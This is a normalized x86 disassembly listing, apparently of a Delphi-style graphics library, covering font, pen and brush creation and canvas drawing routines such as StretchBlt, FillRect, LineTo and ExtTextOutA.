mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404110
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4082fc
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404110
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4082fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404110
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407b0c
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41ce50
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41cd14
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41c8d0
mov edx esp
mov eax ebx
call sub_41cb08
add esp 0x2c
pop esi
pop ebx
retn
sub_41cd40
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41caf0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41cb08
add esp 0x2c
pop esi
pop ebx
retn
sub_41cd80
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41caf0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b04
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404148
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_4029f4
mov edx esp
mov eax ebx
call sub_41cb08
sub_41cdf8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41cd40
pop esi
pop ebx
retn
sub_41ce24
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41caf0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41cb08
add esp 0x30
pop ebx
retn
sub_41ce58
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41caf0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41cb08
add esp 0x2c
pop esi
pop ebx
retn
sub_41ce88
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41caf0
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41cb08
add esp 0x2c
pop esi
pop ebx
retn
sub_41ceb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41bec8
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41cef4
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bfac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41cf1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413e5c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c6dc
xor eax eax
push ebp
push sub_41cfbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c6dc
xor eax eax
push ebp
push sub_41cf9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c0d4
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d104
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cfa5
mov eax [ ebp - 0x8 ]
call sub_41c6ec
retn
sub_41cfd4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41cfec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c6dc
xor eax eax
push ebp
push sub_41d031
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d038
mov eax [ ebp - 0x4 ]
call sub_41c6ec
retn
sub_41d044
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cfd4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41cfec
add esp 0x10
pop esi
pop ebx
retn
sub_41d06c
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41beb0
xor eax eax
push ebp
push sub_41d0f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41bebc
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c698
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41d120
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cfd4
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41cfec
add esp 0x10
pop esi
pop ebx
retn
sub_41d150
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41cfd4
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41cfec
sub_41d17c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41bec8
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41d1bc
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bfac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41d1e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413e5c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c6dc
xor eax eax
push ebp
push sub_41d274
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c6dc
xor eax eax
push ebp
push sub_41d257
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c0d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d25e
mov eax [ ebp - 0x8 ]
call sub_41c6ec
retn
sub_41d28c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41d2a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c6dc
xor eax eax
push ebp
push sub_41d2ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d2f4
mov eax [ ebp - 0x4 ]
call sub_41c6ec
retn
sub_41d2f8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41d2a8
add esp 0x10
pop edi
pop esi
retn
sub_41d324
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d28c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41d2a8
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41d358
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41beb0
xor edx edx
push ebp
push sub_41d425
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41bebc
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c698
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41d440
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d28c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41d2a8
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41d474
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c984
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dd24
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ceb0
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dd44
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d17c
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41dd64
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_413b9c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41d538
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_413c38
xor edx edx
mov eax esi
call sub_41db5c
mov eax [ esi + 0xc ]
call sub_4030f0
mov eax [ esi + 0x10 ]
call sub_4030f0
mov eax [ esi + 0x14 ]
call sub_4030f0
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e30
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41d594
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41dbb0
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41d61c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
mov eax [ ebx + 0x14 ]
call sub_41d31c
call sub_41c698
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c698
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41242c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d6c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
mov eax [ ebx + 0x14 ]
call sub_41d358
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d704
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
mov eax [ ebx + 0x14 ]
call sub_41d358
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d740
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d7a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d7cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d804
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d840
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41dadc
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41d86c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
mov eax ebx
call sub_41d840
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_40416c
push eax
mov eax esi
call sub_40436c
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_41d93c
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d7a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_41d93c
inc eax
add edi eax
sub_41d8f8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40416c
push eax
mov eax edi
call sub_40436c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d93c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d8f8
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d958
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d8f8
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d978
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d9c4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9cb
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d778
sub_41da24
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41da48
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d7a0
pop ecx
pop edx
pop edi
pop esi
retn
sub_41da68
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41da94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41dbb0
mov eax [ ebp + 0x8 ]
call sub_41c698
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41dafc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41db5c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41dafc
mov edx esp
mov eax ebx
call sub_41da24
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41da48
sub_41dbb0
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41dc4c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
test bl 0x8
je r-xdata
mov eax esi
call sub_41dc78
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41dca8
sub_41dc4c
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41cb6c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c698
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41dc78
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d06c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41dca8
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41d358
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41d358
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41d438
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41d31c
call sub_41c698
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41d31c
call sub_41c698
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41ddcc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41de16
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de1d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_41de20
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41debc
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41ddcc
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_40411c
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dec3
lea eax [ ebp - 0x104 ]
call sub_403eac
retn
sub_41ded8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41e026
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
